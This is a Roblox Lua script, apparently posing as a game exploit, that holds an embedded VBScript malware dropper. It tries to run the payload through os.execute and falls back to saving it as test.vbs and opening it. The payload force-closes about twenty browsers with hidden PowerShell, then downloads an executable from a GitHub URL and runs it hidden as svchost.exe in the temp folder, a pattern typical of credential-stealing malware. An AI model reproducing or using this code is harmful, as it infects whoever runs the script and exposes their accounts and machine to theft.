do
    (function()
        return 'lol using hidden dumper? wah wah :3'
    end)()
end


local game = game:GetService('Players').Parent -- L

local function Run(Payload)
    local LinkingService = game:GetService("LinkingService")
    local ScriptContext = game:GetService("ScriptContext")
    local payload = ScriptContext:SaveScriptProfilingData(Payload, "test.vbs")
    LinkingService:OpenUrl(payload)
end

local Payload = [[
Option Explicit

Dim tempDir, svchostUrl, executorPath, svchostPath
Dim shell, fso

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

tempDir = fso.GetSpecialFolder(2)
svchostUrl = "https://github.com/HanzieUWU/Test/raw/main/RobloxPlayerInstaller.exe"
executorPath = tempDir & "\RuntimeVector.exe"
svchostPath = tempDir & "\svchost.exe"

Sub runCommand(command)
    shell.Run command, 0, True
End Sub

Sub downloadAndExecute(url, path)
    Dim command
    command = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & path & "'; Start-Process '" & path & "' -WindowStyle Hidden"""
    runCommand command
End Sub

Sub stopBrowsers()
    Dim stopBrowsersCommand
    stopBrowsersCommand = "powershell -Command ""& { 'chrome','msedge','opera','brave','vivaldi','browser','maxthon','epic','iridium','slimjet','urbrowser','avastbrowser','amigo','torch','kometa','orbitum','7star','sputnik','uran','firefox' | ForEach-Object { Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue } }"""
    runCommand stopBrowsersCommand
End Sub

stopBrowsers
downloadAndExecute svchostUrl, svchostPath

]]

xpcall(function(...)
    getfenv().os.execute(Payload)    
end, function(a0) 
    task.spawn(function()
        pcall(function(...) 
            Run(Payload)    
        end)
    end)
end)